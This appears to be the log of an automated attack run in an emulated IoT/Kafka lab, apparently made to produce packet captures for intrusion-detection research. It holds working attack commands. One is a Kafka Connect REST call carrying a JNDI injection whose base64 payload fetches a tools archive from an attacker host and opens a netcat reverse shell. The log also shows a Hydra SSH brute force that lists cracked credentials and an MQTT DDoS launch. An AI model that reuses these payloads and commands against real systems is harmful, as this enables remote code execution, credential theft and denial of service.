+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt24_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-25", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  45416  40500 --:--:-- --:--:-- --:--:-- 85916
+{"name":"source-mqtt24_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-25","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt24_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='java -jar /tmp/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar'
+Container will execute command='javac FileServer.java; java FileServer'
+sinetstream-client-connect-1 console is now available... Press RETURN to get started.
+[?2004hroot@sinetstream-client-connect-1:/#
+cd /tmp
+rm -rf tools*
+wget -q -O tools.zip http://192.168.15.13:8080/tools.zip
+unzip -qq tools.zip
+cd tools/hydra
+./configure --prefix=/tmp --disable-xhydra
+make
+make install
+cd ..
+tar -xzf sps.gz
+cd sshpass-1.10/
+./configure
+make
+cd ..
+ sleep 1
+nc 192.168.15.13 4444 -e /bin/bash
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt_2024_03_11_10_58_52_231993", "config": {"source.cluster.bootstrap.servers": "192.168.15.11:9092", "target.cluster.bootstrap.servers": "192.168.15.11:9092", "connector.class": "org.apache.kafka.connect.mirror.MirrorSourceConnector", "source.cluster.alias": "kafka", "producer.override.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\"ldap://192.168.15.13:1389/serial/CommonsCollections9/exec_unix/Y2QgL3RtcDtybSAtcmYgdG9vbHMqO3dnZXQgLXEgLU8gdG9vbHMuemlwIGh0dHA6Ly8xOTIuMTY4LjE1LjEzOjgwODAvdG9vbHMuemlwO3VuemlwIC1xcSB0b29scy56aXA7Y2QgdG9vbHMvaHlkcmE7Li9jb25maWd1cmUgLS1wcmVmaXg9L3RtcCAtLWRpc2FibGUteGh5ZHJhO21ha2U7bWFrZSBpbnN0YWxsO2NkIC4uO3RhciAteHpmIHNwcy5nejtjZCBzc2hwYXNzLTEuMTAvOy4vY29uZmlndXJlO21ha2U7Y2QgLi47IHNsZWVwIDE7bmMgMTkyLjE2OC4xNS4xMyA0NDQ0IC1lIC9iaW4vYmFzaA==\\" useFirstPass=\\"true\\" serviceName=\\"fKQSe\\" debug=\\"true\\" group.provider.url=\\"Ncjm9\\";", "producer.override.security.protocol": "SASL_SSL", "producer.override.sasl.mechanism": "SCRAM-SHA-256"}}\' http://192.168.15.12:8083/connectors'
+finished 1st RCE: tools transfered to customconnect, reverseshell open
+./transfile.sh sop 192.168.18-19.10-16 --max-rate 1 -p 22
+funEnd
+
+./transfile.sh hyd -f -L u.txt -P psmall.txt -t 2
+Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-11 01:59:48
+[DATA] max 2 tasks per 10 servers, overall 20 tasks, 672 login tries (l:56/p:12), ~336 tries per task
+[DATA] attacking ssh://(10 targets):22/
+[STATUS] 180.00 tries/min, 180 tries in 00:01h, 6540 to do in 00:37h, 20 active
+[22][ssh] host: 192.168.19.12   login: test   password: password
+[STATUS] attack finished for 192.168.19.12 (valid pair found)
+[22][ssh] host: 192.168.19.14   login: test   password: password
+[STATUS] attack finished for 192.168.19.14 (valid pair found)
+[22][ssh] host: 192.168.18.13   login: test   password: password
+[STATUS] attack finished for 192.168.18.13 (valid pair found)
+[22][ssh] host: 192.168.18.14   login: test   password: password
+[STATUS] attack finished for 192.168.18.14 (valid pair found)
+[22][ssh] host: 192.168.19.10   login: test   password: password
+[STATUS] attack finished for 192.168.19.10 (valid pair found)
+[22][ssh] host: 192.168.19.11   login: test   password: password
+[STATUS] attack finished for 192.168.19.11 (valid pair found)
+[22][ssh] host: 192.168.19.13   login: test   password: password
+[STATUS] attack finished for 192.168.19.13 (valid pair found)
+[22][ssh] host: 192.168.18.12   login: test   password: password
+[STATUS] attack finished for 192.168.18.12 (valid pair found)
+[22][ssh] host: 192.168.18.11   login: test   password: password
+[STATUS] attack finished for 192.168.18.11 (valid pair found)
+[STATUS] 150.67 tries/min, 452 tries in 00:03h, 6268 to do in 00:42h, 2 active
+[STATUS] 72.29 tries/min, 506 tries in 00:07h, 6214 to do in 01:26h, 2 active
+[STATUS] 41.60 tries/min, 624 tries in 00:15h, 6096 to do in 02:27h, 2 active
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+funEnd
+
+./transfile.sh tfl success.txt mqttsa
+funEnd
+
+./transfile.sh lcmd success.txt /tmp/mqttsa -fc 1000 -fcsize 20 -sc 12000 192.168.2.1
+funEnd
+Waiting start and end of process on ['iotsim-domotic-monitor-bis-2', 'iotsim-domotic-monitor-bis-3', 'iotsim-domotic-monitor-bis-4', 'iotsim-domotic-monitor-bis-5', 'iotsim-cooler-motor-1', 'iotsim-cooler-motor-2', 'iotsim-cooler-motor-3', 'iotsim-cooler-motor-4', 'iotsim-cooler-motor-5']
+start detected for  <Container: 33d47630a5ee> {<Container: 25a5dbde6fc7>: [0, 0], <Container: 1a634796edd6>: [0, 0], <Container: a6faf7527ca3>: [0, 0], <Container: e0db96a3481d>: [0, 0], <Container: b13f9f1088ac>: [0, 0], <Container: c886847e82b8>: [0, 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [0, 0]}
+start detected for  <Container: 068adffdc2ad> {<Container: 25a5dbde6fc7>: [0, 0], <Container: 1a634796edd6>: [0, 0], <Container: a6faf7527ca3>: [0, 0], <Container: e0db96a3481d>: [0, 0], <Container: b13f9f1088ac>: [0, 0], <Container: c886847e82b8>: [0, 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+start detected for  <Container: 25a5dbde6fc7> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [0, 0], <Container: a6faf7527ca3>: [0, 0], <Container: e0db96a3481d>: [0, 0], <Container: b13f9f1088ac>: [0, 0], <Container: c886847e82b8>: [0, 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+start detected for  <Container: 1a634796edd6> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), 0], <Container: a6faf7527ca3>: [0, 0], <Container: e0db96a3481d>: [0, 0], <Container: b13f9f1088ac>: [0, 0], <Container: c886847e82b8>: [0, 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+start detected for  <Container: a6faf7527ca3> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), 0], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), 0], <Container: e0db96a3481d>: [0, 0], <Container: b13f9f1088ac>: [0, 0], <Container: c886847e82b8>: [0, 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+start detected for  <Container: e0db96a3481d> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), 0], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), 0], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), 0], <Container: b13f9f1088ac>: [0, 0], <Container: c886847e82b8>: [0, 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+start detected for  <Container: b13f9f1088ac> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), 0], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), 0], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), 0], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), 0], <Container: c886847e82b8>: [0, 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+start detected for  <Container: c886847e82b8> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), 0], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), 0], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), 0], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), 0], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [0, 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+start detected for  <Container: d267c43bb96d> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), 0], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), 0], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), 0], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), 0], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: 1a634796edd6> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), 0], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), 0], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), 0], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: a6faf7527ca3> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), 0], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), 0], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: e0db96a3481d> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 248284, tzinfo=datetime.timezone.utc)], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), 0], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: b13f9f1088ac> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 248284, tzinfo=datetime.timezone.utc)], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 432375, tzinfo=datetime.timezone.utc)], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), 0], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: 33d47630a5ee> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), 0], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 248284, tzinfo=datetime.timezone.utc)], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 432375, tzinfo=datetime.timezone.utc)], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 508258, tzinfo=datetime.timezone.utc)], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: 25a5dbde6fc7> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 939932, tzinfo=datetime.timezone.utc)], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 248284, tzinfo=datetime.timezone.utc)], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 432375, tzinfo=datetime.timezone.utc)], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), 0], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 508258, tzinfo=datetime.timezone.utc)], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: c886847e82b8> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 939932, tzinfo=datetime.timezone.utc)], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 248284, tzinfo=datetime.timezone.utc)], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 432375, tzinfo=datetime.timezone.utc)], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 2, 79860, tzinfo=datetime.timezone.utc)], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 508258, tzinfo=datetime.timezone.utc)], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), 0]}
+end detected for  <Container: 068adffdc2ad> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 939932, tzinfo=datetime.timezone.utc)], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 248284, tzinfo=datetime.timezone.utc)], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 432375, tzinfo=datetime.timezone.utc)], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 2, 79860, tzinfo=datetime.timezone.utc)], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), 0], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 508258, tzinfo=datetime.timezone.utc)], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 2, 441296, tzinfo=datetime.timezone.utc)]}
+end detected for  <Container: d267c43bb96d> {<Container: 25a5dbde6fc7>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 922215, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 939932, tzinfo=datetime.timezone.utc)], <Container: 1a634796edd6>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 935085, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 50708, tzinfo=datetime.timezone.utc)], <Container: a6faf7527ca3>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 945845, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 0, 389344, tzinfo=datetime.timezone.utc)], <Container: e0db96a3481d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 956849, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 248284, tzinfo=datetime.timezone.utc)], <Container: b13f9f1088ac>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 967826, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 432375, tzinfo=datetime.timezone.utc)], <Container: c886847e82b8>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 981684, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 2, 79860, tzinfo=datetime.timezone.utc)], <Container: d267c43bb96d>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 992548, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 2, 911218, tzinfo=datetime.timezone.utc)], <Container: 33d47630a5ee>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 899579, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 1, 508258, tzinfo=datetime.timezone.utc)], <Container: 068adffdc2ad>: [datetime.datetime(2024, 3, 11, 2, 18, 46, 911408, tzinfo=datetime.timezone.utc), datetime.datetime(2024, 3, 11, 2, 20, 2, 441296, tzinfo=datetime.timezone.utc)]}
+finished DDoS payload execution
+found 1 switches
+Finding links in switch VyOS1.3.0-1... 3 found
+	 Stopping capture in link VyOS1.3.0-1 <--> VyOS1.3.0-1... Capturing False, None
+OK
+	 Stopping capture in link VyOS1.3.0-1 <--> VyOS1.3.0-1... Capturing False, VyOS130-1_1-0_to_VyOS130-2_1-0.pcap
+OK
+	 Stopping capture in link VyOS1.3.0-1 <--> VyOS1.3.0-1... Capturing False, None
+OK
+found 4 switches
+Finding links in switch sinetstream-zookeeper-1... 1 found
+	 Stopping capture in link OpenvSwitch-15 <--> sinetstream-zookeeper-1... Capturing False, OpenvSwitch-15_2-0_to_sinetstream-zookeeper-1_0-0.pcap
+OK
+Finding links in switch sinetstream-kafka-broker-1... 1 found
+	 Stopping capture in link OpenvSwitch-15 <--> sinetstream-kafka-broker-1... Capturing False, None
+OK
+Finding links in switch sinetstream-connect-kafka-1... 1 found
